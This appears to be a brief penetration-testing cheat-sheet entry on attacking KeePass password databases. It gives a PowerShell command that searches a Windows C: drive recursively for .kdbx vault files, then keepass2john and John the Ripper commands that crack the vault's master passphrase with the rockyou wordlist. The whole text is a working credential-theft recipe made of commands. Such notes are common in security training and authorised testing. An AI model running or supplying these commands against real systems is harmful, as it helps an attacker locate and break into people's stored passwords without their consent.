Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue #<--- Detect all Keepass files on the system.

# Keepass file are password containers from users, it can be open with KeePass GUI after introduce a passpharese.
# We can try to crack this passphrase with john kit:

keepass2john Database.kdbx > Database.hash
john Database.hash -w=/usr/share/wordlists/rockyou.txt
